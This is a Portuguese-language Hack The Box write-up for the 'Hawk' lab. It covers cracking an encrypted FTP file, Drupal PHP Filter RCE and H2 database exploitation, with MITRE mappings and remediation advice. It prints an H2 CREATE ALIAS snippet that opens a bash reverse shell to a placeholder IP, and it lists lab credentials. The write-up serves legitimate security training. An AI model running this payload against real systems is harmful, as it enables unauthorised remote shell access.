---
title: "Writeup Hack The Box: Hawk"
date: 2025-12-18
description: "Ataque em múltiplas etapas envolvendo quebra de criptografia FTP, RCE em Drupal e exploração de banco de dados H2."
tags: ["htb", "drupal", "h2-database", "encryption", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Sumário Executivo

**Hawk** foi comprometido através de uma cadeia envolvendo **exposição de credenciais via FTP**, **RCE no Drupal**, e **execução remota de comandos no H2 Database Console**. O ataque resultou em movimentação lateral via SSH e escalação final para **root** abusando do serviço H2.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Descoberta e Quebra de Criptografia
O acesso FTP anônimo forneceu um arquivo criptografado `.drupal.txt.enc`. Usando o `bruteforce-salted-openssl`, a senha "friends" foi identificada, revelando as credenciais do Drupal.
* **Técnica MITRE:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/) - Credenciais Não Seguras: Senhas em Arquivos.

#### 2. Acesso Inicial (Drupal)
O módulo "PHP Filter" foi habilitado dentro do painel administrativo do Drupal, permitindo a execução de uma shell reversa arbitrária.
* **Técnica MITRE:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploração de Aplicação Voltada para o Público.

#### 3. Movimentação Lateral e PrivEsc
A reutilização de credenciais SSH (`daniel:drupal4hawk`) permitiu o acesso via shell. A enumeração local identificou o **H2 Database Console** rodando na porta 8082. Usando **SSH port forwarding**, o console foi acessado e explorado via `CREATE ALIAS` (Exploit-DB #45506).
```sql
CREATE ALIAS SHELLEXEC AS $$String shellexec(String cmd) throws ...$$;
CALL SHELLEXEC('bash -i >& /dev/tcp/<IP>/4444 0>&1')
```
Como o H2 estava rodando como root, a shell resultante era privilegiada.
* **Técnica MITRE:** [T1090](https://attack.mitre.org/techniques/T1090/) - Proxy de Conexão.

### Remediação (NIST SP 800-115)

* **Segurança de Serviço:** Desabilitar o FTP anônimo e restringir módulos perigosos de CMS (PHP Filter).
* **Gestão de Identidade:** Forçar o uso de senhas únicas para todos os serviços.
* **Menor Privilégio:** Não executar consoles administrativos (como o H2) com privilégios de root.